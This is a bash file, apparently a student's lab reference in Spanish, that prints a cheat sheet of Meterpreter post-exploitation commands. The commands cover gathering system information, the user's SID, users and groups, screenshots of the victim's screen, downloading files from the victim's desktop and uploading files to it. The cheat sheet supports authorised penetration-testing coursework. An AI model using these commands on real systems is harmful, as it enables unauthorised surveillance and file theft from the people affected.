#!/bin/bash
# Guia rapida de post-explotacion con meterpreter
# Este archivo no se ejecuta, es referencia de comandos

cat << 'EOF'
====================================
 POST-EXPLOTACION - REFERENCIA
====================================

Una vez que aparece "meterpreter >" en msfconsole:

--- INFORMACION QUE PIDE LA PRACTICA ---

1. Informacion del sistema:
   meterpreter > sysinfo

   Muestra: nombre del equipo, OS, arquitectura, dominio, idioma.

2. SID del usuario:
   meterpreter > shell

   Dentro del shell de Windows:
   C:\> whoami /user

   Resultado ejemplo:
   EQUIPO\usuario  S-1-5-21-3623811015-3361044348-30300820-1013
                   ^--- ese es el SID

   Salir del shell: exit

3. Nombre del usuario actual:
   meterpreter > getuid

   O dentro del shell:
   C:\> whoami
   C:\> echo %username%

4. Listado del directorio actual:
   meterpreter > ls
   meterpreter > pwd

   O dentro del shell:
   C:\> dir
   C:\> cd %userprofile% && dir

--- COMANDOS EXTRA UTILES ---

Ver procesos corriendo:
   meterpreter > ps

Tomar screenshot de la pantalla:
   meterpreter > screenshot

Descargar un archivo del equipo victima:
   meterpreter > download C:\\Users\\victima\\Desktop\\archivo.txt

Subir un archivo al equipo victima:
   meterpreter > upload archivo.txt C:\\Users\\victima\\Desktop\\

Ver conexiones de red activas (en el shell):
   C:\> netstat -an

Ver usuarios del sistema (en el shell):
   C:\> net user

Ver grupos del usuario (en el shell):
   C:\> net localgroup administrators

Cerrar la sesion:
   meterpreter > exit

====================================
 PARA DOCUMENTAR EN EL INFORME
====================================

Capturar la salida de cada comando con screenshot o copiando el texto.
Incluir al menos:
  - Captura de "sysinfo"
  - Captura de "whoami /user" con el SID
  - Captura de "dir" en el escritorio del usuario

EOF
